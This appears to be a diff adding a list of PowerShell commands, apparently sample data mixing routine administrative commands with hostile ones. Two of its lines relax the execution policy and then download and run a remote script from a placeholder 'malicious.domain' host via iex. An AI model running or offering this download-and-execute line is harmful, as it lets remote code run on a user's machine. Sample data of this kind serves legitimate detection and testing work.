@@ -1,0 +1,8 @@
+Get-ChildItem -Recurse C:\Users\Public
+Set-ExecutionPolicy Unrestricted -Scope Process
+iex (New-Object Net.WebClient).DownloadString('http://malicious.domain/payload.ps1')
+Get-EventLog -LogName Security -Newest 20
+whoami /priv
+cd C:\Windows\System32
+Get-Process | Where-Object { $_.CPU -gt 100 }
+Remove-Item -Path "C:\Users\Public\test.bat"
